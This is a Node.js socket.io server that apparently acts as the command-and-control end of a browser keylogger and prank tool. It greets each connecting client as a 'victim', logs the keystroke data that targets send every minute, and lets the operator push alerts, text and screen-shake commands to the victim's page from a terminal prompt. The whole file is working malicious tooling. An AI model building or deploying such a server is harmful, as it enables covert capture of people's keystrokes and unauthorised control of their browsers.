


var port = 1337;

const io = require('socket.io')(port, {
    cors: {
        origin: "*"
    }
})

console.log(`Listening to port: ${port}`);
const readline = require("readline");
const rl = readline.createInterface(process.stdin, process.stdout)




io.on('connection', socket => {
    console.log(`\nnew user: ${socket.id}`)
    socket.emit("greet", "hello thanks for being a victim")
    // if keylog is on we get data from target every 1 minute
    
    socket.on('keylog', data => {
        console.log(data);
    })
    
    function asynchwhile() {
        return new Promise(function(resolve, reject) {
          rl.setPrompt('Send> ')
          rl.prompt();
          rl.on('line', function(line) {
            if (line === "exit" || line === "quit" || line == 'q') {
              rl.close()
              return 
            }
      
            if (line.includes("shake") && line.includes("(") && line.includes(")")){
              socket.emit("shake", `${line.slice(6,-1)} `);
            } else if (line === "normal") {
              socket.emit("normal", "normal")
            } else if (line === "smile") {
              console.log('Send out the evil smile')
              socket.emit("smile", "smile");
            } else if (line.includes("text") && line.includes("(") && line.includes(")")){
                socket.emit("text", `${line.slice(5,-1)} `);
            } else if (line === "lists"){
                console.log("\nActive users: " + socket.id);
            } else if (line.includes("alert") && line.includes("(") && line.includes(")")){
              socket.emit("alert", `${line.slice(6,-1)} `);
            }
            rl.prompt()
      
          }).on('close',function(){
            console.log('bye')
            resolve(42) // this is the final result of the function
          });
        })
      }
      
      async function run() {
        try {
          let replResult = await asynchwhile()
        //   console.log('repl result:', replResult)
      
        } catch(e) {
          console.log('failed:', e)
        }
      }
      
      run()
})
